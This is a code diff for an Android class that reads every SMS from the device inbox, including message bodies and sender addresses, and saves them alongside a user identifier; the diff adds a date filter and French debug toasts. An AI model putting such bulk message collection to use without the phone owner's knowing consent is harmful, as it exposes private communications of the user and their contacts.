@@ -10,6 +10,7 @@ import android.os.AsyncTask;
 
 import android.provider.Telephony;
 import android.support.v7.app.AppCompatActivity;
+import android.widget.Toast;
 
 
 import org.apache.http.HttpEntity;
@@ -63,13 +64,13 @@ public class SaveUserMessage extends AppCompatActivity {
 
         String where = "date >='" + Where() + "'";
         ContentResolver contentResolver = context.getContentResolver();
-        Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
+        Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, where, null, null);
         int idsms = smsInboxCursor.getColumnIndex("_id");
         int indexBody = smsInboxCursor.getColumnIndex("body");
         int indexAddress = smsInboxCursor.getColumnIndex("address");
         int dat = smsInboxCursor.getColumnIndex("date_sent");
         int typesms = smsInboxCursor.getColumnIndex("type");
-
+        String question="boujour";
 
         if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
         do {
@@ -90,10 +91,10 @@ public class SaveUserMessage extends AppCompatActivity {
                     dateFormatter,
                     heureFormatter,
                     "actif");
-
+            question="passage dans do";
         } while (smsInboxCursor.moveToNext());
         smsInboxCursor.close();
-
+        Toast.makeText(context,"on sort du do avec "+ question,Toast.LENGTH_LONG).show();
         SaveUserCommonProprety saveUserCommonProprety = new SaveUserCommonProprety(context,uuid_user);
         saveUserCommonProprety.SaveUserCommonPropreties();
 
